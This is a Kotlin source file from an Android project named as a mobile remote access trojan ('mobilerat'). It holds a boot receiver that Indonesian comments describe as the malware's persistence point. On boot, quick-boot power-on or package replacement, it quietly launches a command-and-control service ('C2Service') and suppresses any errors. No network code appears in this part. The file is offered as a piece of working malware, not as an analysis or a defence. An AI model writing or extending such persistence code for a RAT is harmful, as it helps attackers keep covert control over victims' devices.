package com.kai.mobilerat

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

/**
 * Titik persistensi. Di Android tidak ada registry Run key; satu-satunya
 * autostart yang bertahan tanpa root adalah BOOT_COMPLETED. startForegroundService
 * wajib dipakai di API 26+, kalau tidak system melempar IllegalStateException
 * saat perangkat selesai boot.
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        if (action != Intent.ACTION_BOOT_COMPLETED &&
            action != "android.intent.action.QUICKBOOT_POWERON" &&
            action != Intent.ACTION_MY_PACKAGE_REPLACED
        ) return

        val svc = Intent(context, C2Service::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(svc)
            } else {
                context.startService(svc)
            }
        } catch (_: Exception) {
        }
    }
}
